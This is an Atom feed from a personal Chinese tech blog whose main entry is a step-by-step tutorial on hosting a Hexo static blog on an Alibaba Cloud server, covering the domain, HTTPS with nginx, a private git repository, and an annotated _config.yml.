<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jarvis</title>
  
  <subtitle>个人博客</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="www.jarvis-cy.com/"/>
  <updated>2020-06-06T10:59:40.378Z</updated>
  <id>www.jarvis-cy.com/</id>
  
  <author>
    <name>Jarvis</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>信息收集</title>
    <link href="www.jarvis-cy.com/2020/05/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>www.jarvis-cy.com/2020/05/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2020-05-22T10:53:24.000Z</published>
    <updated>2020-06-06T10:59:40.378Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/img/loading.gif" alt="信息收集" class="lazyload" data-src="/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/img/loading.gif&quot; alt=&quot;信息收集&quot; class=&quot;lazyload&quot; data-src=&quot;/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.png&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="渗透技巧" scheme="www.jarvis-cy.com/categories/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="技巧" scheme="www.jarvis-cy.com/tags/%E6%8A%80%E5%B7%A7/"/>
    
      <category term="思维导图" scheme="www.jarvis-cy.com/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    
  </entry>
  
  <entry>
    <title>Hexo博客搭建</title>
    <link href="www.jarvis-cy.com/2020/05/03/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <id>www.jarvis-cy.com/2020/05/03/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</id>
    <published>2020-05-03T11:21:58.000Z</published>
    <updated>2020-06-11T11:26:10.846Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Hexo介绍"><a href="#1-Hexo介绍" class="headerlink" title="1. Hexo介绍"></a>1. Hexo介绍</h2><p>Hexo是一个快速, 简洁且高效的个人博客框架。 可以让上百个页面在几秒内瞬间完成渲染。 Hexo支持Github Flavored Markdown的所有功能， 甚至可以整合Octopress的大多数插件。 并自己也拥有强大的插件系统。</p><h2 id="2-个人服务器部署"><a href="#2-个人服务器部署" class="headerlink" title="2. 个人服务器部署"></a>2. 个人服务器部署</h2><h3 id="2-1-服务器的选择与租赁"><a href="#2-1-服务器的选择与租赁" class="headerlink" title="2.1 服务器的选择与租赁"></a>2.1 服务器的选择与租赁</h3><ol><li><p>对于个人博客来说，在搭建好之后，首先要能在公网访问到他，而这个时候我们一般有两个选择，第1个是选择github或者是码云这样的面向开源及私有软件项目的托管平台，在这样的平台中，他们会提供类似于gitpage这样的服务，可以使个人博客在上传到代码仓库之后，提供给开发者一个个人域名并可以访问自己的个人博客。第二个选择则是在各大，云计算和大数据服务提供商，例如网易云，腾讯云，阿里云中选择其中一个并租赁云服务器，在云服务器中建立自己的私人代码仓库，将个人博客上传到该代码仓库，并在配置好web服务器，购买一个合适的域名后，通过该域名访问自己的个人博客</p></li><li><p>考虑到代码安全以及个人博客的访问速度，在有能力的情况下，还是建议选择自己去租赁云服务器来进行搭建。</p></li><li><p>于是此处我们选择阿里云，作为我们的云服务器提供商，进到阿里云的首页后，我们选择购买它的云服务器ECS，这是一种弹性可伸缩的计算服务，可以降低it成本，提高运维效率，可以让我们更专注于核心业务创新。</p></li><li><p>进到购买页面后，我们对于付费模式由于是个人博客，所以直接选择包年包月来进行付费。因为考虑到个人博客的实际访问量，与个人博客本身对于服务器性能的需求，我们可以直接选择最低要求来进行付费购买。<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h2-1-1.png"></p></li><li><p>我选择了磁盘地域在北京，磁盘属性为系统盘，磁盘种类为SSD云盘，磁盘容量为40GB，磁盘名称为SystemDisk，挂载实例为Centos的一台云服务器<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h2-1-2.png"></p></li></ol><h3 id="2-2-域名选择与备案"><a href="#2-2-域名选择与备案" class="headerlink" title="2.2 域名选择与备案"></a>2.2 域名选择与备案</h3><ol><li>在租赁好云服务器之后，接下来便要选择，购买域名。</li><li>域名又称网域，这是一串用点分隔的名字组成的在internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识。由于原本的IP地址具有不方便记忆，并且也不能显示该地区组织的名称和性质等缺点，人们设计了域名。之后并通过网域名称系统也就是DNS来将域名和IP地址相互映射，使人们可以更加便捷地访问互联网，而不用去记住能够被机器直接读取的IP地址数据串。</li><li>此处我选择购买以.cn为结尾的顶级域名，.cn域名是由我国管理的，国际顶级域名是中国互联网的标识，cn一般代表中国，它体现了一种文化的认同，自身的价值和定位，当前私人域名在全球具有最大的市场，适合任何的企业组织和个人来进行注册</li><li>在域名选择完成并购，买完域名之后，接下来就要进行域名备案，也就是DNICP（Domain Name Internet Content Provider）。</li><li>域名备案的目的是为了防止人们在网上从事非法的网站经营活动，打击不良互联网信息传播。如果在国内的网站不进行备案的话，很有可能被查处以后关停。如果云服务器选择的是国外的服务器，或者香港的服务器。则不需要备案，但我们选择的是北京的服务器，所以必须要进行网站备案</li><li>我们打开阿里云官方网站后，选择备案，然后进入备案系统，在备案系统中依次填入相关的信息，填入完成后点击验证，并提交相关信息，等待初审核，提交备案后，阿里云会在一个工作日内进行初审，下载网站信息备案，核验单打印出来后进行手动签字。之后申请邮寄幕布，按照要求进行拍照，再上传幕布。当这些操作都完成后，我们就可以等待通信管理局审核，等通信管理局审核通过后备案就成功了。</li></ol><h3 id="2-3-负载均衡"><a href="#2-3-负载均衡" class="headerlink" title="2.3 负载均衡"></a>2.3 负载均衡</h3><ol><li>现在每天有超过40亿人在使用互联网，在过去的几年中，互联网上的流量消费业务类型均呈指数型增长。如今消费者们希望网站具有极快的加载速度，提供无缝的用户体验，因此网站必须具备强大的可靠性和弹性的可扩展能力才能对大量的访问进行高效处理和快速响应，以电商网站为例，每逢双11都会有数以亿计的剁手党在互联网上浏览和购买打折商品，随着网站访问量的激增，服务机会超负荷运行，造成网站反应迟缓或者交易失败。单个服务器的故障会严重影响整个应用和用户体验，造成巨大损失，这对企业而言是不可接受的灾难性后果</li><li>为了个人博客的运行流程，我选择了阿里云负载均衡SLB服务。阿里云负载均衡SLB支持高可靠业务部署，后端服务器可分布于不同可用区，作为流量大管家，SLB将客户请求平均分发给后端服务器。并通过健康状态检查，自动剔除异常的服务器。使用负载均衡SLB可消除系统中单点故障，提升系统可靠性实现业务永序，从而保障用户体验。可以根据业务需求选择购买公网或私网SLB实例</li><li>SLB与弹性伸缩服务实现了无缝整合，可自动根据流量波峰波谷，调节后端服务器数量实现弹性伸缩，SLB同时可为您的服务器提供免费的云上安全防护，抵御SYN Flood攻击和DDoS攻击，并根据您设定的路由转发策略，将流量只分发给指定的后端服务器，以满足多样化业务场景。</li><li>SLB支持多可用区部署，可实现跨可用区容灾，阿里云负载均衡SLB已经率先支持IPV6，更有HTTP2/WEBSOCKET/ACL访问控制/SNI多证书/超强性能保障型实例等众多灵活且强大的功能特性。</li><li>于是我选择购买北京地区的实例类型为公网的负载均衡服务，从而保证了该博客的业务永续<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h2-3-1.png"></li></ol><h3 id="2-4-HTTPS"><a href="#2-4-HTTPS" class="headerlink" title="2.4 HTTPS"></a>2.4 HTTPS</h3><ol><li>在平时上网的过程中，网页要从服务端传到客户端，一般是通过http的协议传输的，该协议为明文传输方式，所以因为这个特性带来了一定的隐患，例如网页上被植入小广告，或内容被篡改。在这样一个前提下，如果想要让网站更加的安全，可以选择给http加上s。而变成https的过程，就需要用到证书服务。</li><li>此s可以理解为使用ssl的加密方式来进行传输。能一定程度的防泄密，防篡改，防假冒。此处我选择阿里云的证书服务来为我的个人博客提供ssl证书。阿里云的证书服务有DV版OA版和EV版，通常来讲，个人的网站一般来说使用DV版。</li><li>在购买完之后，进行信息的补全，补全完成后，验证自己的域名的所有权，在域名解析处添加一条新的解析，这条解析记录会在证书服务那边显示出来。一般来讲三个小时便可以审核完成。当审核通过后，下载对应的证书文件，将证书文件放置于web服务器中，到此个人博客便加上了s的保护</li><li>在添加到web服务器时，首先将需要添入的代码再添加到文件之前就修改好内容<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">443</span> ssl;   <span class="comment">#SSL协议访问端口号为443。此处如未添加ssl，可能会造成Nginx无法启动。</span></span><br><span class="line"><span class="attribute">server_name</span> www.haochisclg.cn;  <span class="comment">#将localhost修改为您证书绑定的域名，例如：www.example.com。</span></span><br><span class="line"><span class="attribute">root</span> /home/wwwroot/default;</span><br><span class="line"><span class="attribute">index</span> index.html index.htm;</span><br><span class="line"><span class="attribute">ssl_certificate</span> cert/3868216_www.haochisclg.cn.pem;   <span class="comment">#将domain name.pem替换成您证书的文件名。</span></span><br><span class="line"><span class="attribute">ssl_certificate_key</span> cert/3868216_www.haochisclg.cn.key;   <span class="comment">#将domain name.key替换成您证书的密钥文件名。</span></span><br><span class="line"><span class="attribute">ssl_session_timeout</span> <span class="number">5m</span>;</span><br><span class="line"><span class="attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;  <span class="comment">#使用此加密套件。</span></span><br><span class="line"><span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;   <span class="comment">#使用该协议进行配置。</span></span><br><span class="line"><span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;   </span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">root</span> /home/wwwroot/default;   <span class="comment">#站点目录。</span></span><br><span class="line"><span class="attribute">index</span> index.html index.htm;   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>然后将该内容加入到/usr/local/nginx/conf/nginx.conf中。通过执行/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf，即指定nginx.conf文件的方式重启nginx，再输入nginx -s reload进行重启后，再去查看博客，会发现已经成为了https。</li></ol><h3 id="2-5-建立私人git服务器并配置本地仓库"><a href="#2-5-建立私人git服务器并配置本地仓库" class="headerlink" title="2.5 建立私人git服务器并配置本地仓库"></a>2.5 建立私人git服务器并配置本地仓库</h3><h4 id="2-5-1-建立私人git服务器原因"><a href="#2-5-1-建立私人git服务器原因" class="headerlink" title="2.5.1 建立私人git服务器原因"></a>2.5.1 建立私人git服务器原因</h4><ol><li>由于hexo是一个静态网站框架，所以说由该框架搭建出来的博客也是静态博客，那么就意味着没有相应的后端服务，在我们想要添加文章或者是修改一些地方的时候，并不能使用后台这种操作。而是在本地进行添加，修改后再上传到服务器同步修改。</li><li>所以为了达到这样的效果。我需要在私人服务器上搭建一个自己的git仓库，当该仓库搭建好之后就可以实现网站的一键部署，一键更新。<h4 id="2-5-2-实现过程"><a href="#2-5-2-实现过程" class="headerlink" title="2.5.2 实现过程"></a>2.5.2 实现过程</h4></li><li>安装git： <code>yum install -y git</code><br><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h2-5-2-1.png"><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h2-5-2-2.png"></li><li>创建一个git用户<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">useradd</span> <span class="string">git</span></span><br><span class="line"><span class="attr">passwd</span> <span class="string">git</span></span><br></pre></td></tr></table></figure></li><li>创建仓库<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su - git <span class="comment"># 切换到git用户</span></span><br><span class="line"><span class="keyword">cd</span> / <span class="comment"># 进入根目录下</span></span><br><span class="line">mkdir wxp/blog.git <span class="comment"># 创建一个仓库</span></span><br><span class="line"><span class="keyword">cd</span> blog.git</span><br><span class="line">git <span class="params">--bare</span> init <span class="comment"># 初始化仓库</span></span><br></pre></td></tr></table></figure></li><li>在本地进行密钥生成<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h2-5-2-4.png"></li><li>在服务器端的git用户的家目录下创建相应文件夹以及文件<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/home/git</span></span><br><span class="line">mkdir <span class="string">.ssh</span></span><br><span class="line">chmod 700 <span class="string">.ssh</span> <span class="comment">#一定要修改权限，不然会报错</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">.ssh</span></span><br><span class="line">touch authorized_keys</span><br><span class="line">chmod 600 authorized_keys</span><br></pre></td></tr></table></figure></li><li>将刚才生成的密钥的内容拷贝到authorized_keys这个文件中<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h2-5-2-5.png"><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h2-5-2-6.png"><br>当完成这一步之后，就可以在本机上连接到服务器<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h2-5-2-7.png"><br>直到这一步，私人git服务器就配置完成了。</li></ol><h2 id="3-将Hexo搭建到个人服务器上"><a href="#3-将Hexo搭建到个人服务器上" class="headerlink" title="3. 将Hexo搭建到个人服务器上"></a>3. 将Hexo搭建到个人服务器上</h2><h3 id="3-1-Hexo的安装与环境配置"><a href="#3-1-Hexo的安装与环境配置" class="headerlink" title="3.1 Hexo的安装与环境配置"></a>3.1 Hexo的安装与环境配置</h3><h4 id="3-1-1-安装Node-js"><a href="#3-1-1-安装Node-js" class="headerlink" title="3.1.1 安装Node.js"></a>3.1.1 安装Node.js</h4><ol><li>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。而Hexo是基于nodeJS环境的静态博客，所以在安装Hexo之前的第一步就是安装Node.js。</li><li>前往<a href="https://nodejs.org/zh-cn/下载长期稳定版![Alt" target="_blank" rel="noopener">https://nodejs.org/zh-cn/下载长期稳定版![Alt</a> text](/images/h3-1-1-1.png)根据提示将下载好的msi文件安装好，安装过程中要勾选添加环境变量，这样安装完成后，打开命令提示符，输入”node -v“查看node版本。<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-1-1-2.png"></li><li>npm是随同NodeJS一起安装的包管理工具，能解决NodeJS代码部署上的很多问题，常见的使用场景有以下几种：<ul><li>允许用户从NPM服务器下载别人编写的第三方包到本地使用。</li><li>允许用户从NPM服务器下载并安装别人编写的命令行程序到本地使用。</li><li>允许用户将自己编写的包或命令行程序上传到NPM服务器供别人使用。</li><li>由于新版的nodejs已经集成了npm，所以之前npm也一并安装好了。同样可以通过输入 “npm -v“ 来测试是否成功安装。<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-1-1-3.png"><h4 id="3-1-2-安装Hexo"><a href="#3-1-2-安装Hexo" class="headerlink" title="3.1.2 安装Hexo"></a>3.1.2 安装Hexo</h4></li></ul></li><li>首先创建一个放置博客的文件夹，在该位置打开命令提示符，然后输入npm i -g hexo进行安装<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-1-2-1.jpg"></li><li>安装完成后，再输入hexo init进行博客的初始化<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-1-2-2.png"></li><li>初始化完成后，输入hexo server或hexo s，就可以在本地运行hexo，并看到效果<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-1-2-3.png">打开127.0.0.1:4000即可看到效果<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-1-2-4.png"></li></ol><h3 id="3-2-Hexo的主题选择、配置文件与基础操作"><a href="#3-2-Hexo的主题选择、配置文件与基础操作" class="headerlink" title="3.2 Hexo的主题选择、配置文件与基础操作"></a>3.2 Hexo的主题选择、配置文件与基础操作</h3><h4 id="3-2-1-Hexo主题"><a href="#3-2-1-Hexo主题" class="headerlink" title="3.2.1 Hexo主题"></a>3.2.1 Hexo主题</h4><ol><li><p>Hexo由于是一个静态框架，所以有非常多的人为其开发了不同的外观主题，并添加了各种不同的功能插件。在hexo.io/themes/这个网站可以看到300多种不同的主题。各式各样的风格也符合各种不同的需求。可以是一个旅行日记，可以是一个技术分享博客。可以是一个个人笔记，可以是一个展示自己的平台。</p></li><li><p>这个网站中的所有主题<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-1-1.png"><br>当你点击其中的图片的时候，便可以查看该主题的浏览。<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-1-2.png"><br>当为自己选择喜欢的主题之后，点击该主题的名称即可跳转到对应的github页面<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-1-3.png"><br>将对应的代码下载到本地之后放入博客根目录下的themes里面<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-1-4.png"><br>在这之中有一个本身存在的主题，也就是刚刚初始化好后看到的样式<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-1-5.png"></p></li><li><p>当选定好喜欢的主题后，进入该主题对应的github页面，向下拉找到安装方式<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-1-6.png">，再在刚才的主题文件夹下打开命令提示符，输入：<code>git clone https://github.com/SuperKieran/TKL.git</code><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-1-7.png"></p></li><li><p>下载完成后，返回博客根目录下，打开’_config.yml’这个文件，找到96行<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-1-8.png"><br>将theme后面的内容改为刚下好的主题名称，此处举例为TKL，实际静态博客中使用的主题为yilia-plus。修改完成后，输入 ‘hexo clean &amp;&amp; hexo g &amp;&amp; hexo s’查看修改效果<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-1-9.png"><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-1-10.png"><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-1-11.png"></p></li></ol><h4 id="3-2-2-config-yml配置文件的解析"><a href="#3-2-2-config-yml配置文件的解析" class="headerlink" title="3.2.2 _config.yml配置文件的解析"></a>3.2.2 _config.yml配置文件的解析</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span>   <span class="comment"># 网站标题</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">''</span>  <span class="comment"># 网站副标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">''</span><span class="comment"># 网站描述</span></span><br><span class="line"><span class="attr">keywords:</span><span class="comment"># 网站的关键词。使用半角逗号 , 分隔多个关键词。</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">WXP</span><span class="comment"># 作者的名字</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">en</span><span class="comment"># 网站使用的语言。对于简体中文用户来说，使用不同的主题可能需要设置成不同的值，参考主题的文档自行设置，常见的有 zh-Hans和 zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">''</span><span class="comment"># 网站时区。Hexo 默认使用本电脑的时区。可以参考时区列表进行设置，如 America/New_York, Japan, 和UTC 。一般的，对于中国大陆地区可以使用Asia/Shanghai</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">http://yoursite.com</span><span class="comment"># 网站网址</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span><span class="comment"># 网站根目录</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span><span class="comment"># 文章的永久链接格式，此处为'文章的发表年份（4 位数）/文章的发表月份（2 位数）/文章的发表日期 （2 位数）/文件名称</span></span><br><span class="line"><span class="attr">permalink_defaults:</span><span class="comment"># 永久链接中各部分的默认值</span></span><br><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># 是否在永久链接中保留尾部的 index.html，设置为 false 时去除</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># 是否在永久链接中保留尾部的 .html, 设置为 false 时去除 (对尾部的 index.html无效)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span><span class="comment"># 资源文件夹，这个文件夹用来存放内容。</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span><span class="comment"># 公共文件夹，这个文件夹用于存放生成的站点文件。</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span><span class="comment"># 标签文件夹</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span><span class="comment"># 归档文件夹</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span><span class="comment"># 分类文件夹</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span><span class="comment"># Include code 文件夹，source_dir 下的子目录</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span><span class="comment"># 国际化（i18n）文件夹</span></span><br><span class="line"><span class="attr">skip_render:</span><span class="comment"># 跳过指定文件的渲染。匹配到的文件将会被不做改动地复制到public目录中。可以使用glob表达式来匹配路径。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># 新文章的文件名称</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span><span class="comment"># 预设布局</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># 把标题转换为 title case</span></span><br><span class="line"><span class="attr">external_link:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>                  <span class="comment"># 在新标签中打开链接</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span>                   <span class="comment"># 对整个网站（site）生效或仅对文章（post）生效</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="string">''</span>                   <span class="comment"># 需要排除的域名。主域名和子域名如 www 需分别配置</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span><span class="comment"># 把文件名称转换为 (1) 小写或 (2) 大写</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span><span class="comment"># 显示草稿</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span><span class="comment"># 启动 Asset 文件夹（资源文件夹），如果想要更有规律地提供图片和其他资源以及想要将他们的资源分布在各个文章上，便可以开启该选项。Hexo将会在作者每一次通过 hexo new [layout] &lt;title&gt; 命令创建新文章时自动的创建一个文件夹。这个资源文件夹将会有与这个文章文件一样的名字。然后将所有与你的文章有关的资源放在这个关联文件夹中之后，便可以通过相对路径来引用它们，这样便得到了一个更简单而且方便得多的工作流。</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span><span class="comment"># 把链接改为与根目录的相对位址</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span><span class="comment"># 显示未来的文章</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>                  <span class="comment"># 开启代码块高亮</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span>             <span class="comment"># 显示行数</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span>            <span class="comment"># 如果未指定语言，则启用自动检测</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">''</span>               <span class="comment"># 用 n 个空格替换 tabs；如果值为空，则不会替换 tabs</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span>                    <span class="comment"># 把代码块包装起来</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span>                   <span class="comment"># CSS类使用hljs-*前缀</span></span><br><span class="line"></span><br><span class="line"><span class="attr">index_generator:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">''</span>                      <span class="comment"># 博客索引页的根路径（默认值为''）</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">10</span>                  <span class="comment"># 每页显示的文章数（0为禁用分页）</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span>               <span class="comment"># 发布命令（默认按日期降序）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span> <span class="comment"># 默认分类，默认值为'uncategorized'</span></span><br><span class="line"><span class="attr">category_map:</span>                   <span class="comment"># 分类别名</span></span><br><span class="line"><span class="attr">tag_map:</span>                        <span class="comment"># 标签别名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Metadata elements</span></span><br><span class="line"><span class="comment">## https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta</span></span><br><span class="line"><span class="attr">meta_generator:</span> <span class="literal">true</span>            <span class="comment"># Meta generator 标签。 值为 false 时 Hexo 不会在头部插入该标签</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-MM-DD</span><span class="comment"># 日期格式</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="string">HH:mm:ss</span><span class="comment"># 时间格式</span></span><br><span class="line"><span class="attr">use_date_for_updated:</span> <span class="literal">false</span><span class="comment"># 启用以后，如果 Front Matter 中没有指定 updated， post.updated 将会使用 date 的值而不是文件的创建时间。在 Git 工作流中这个选项会很有用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span 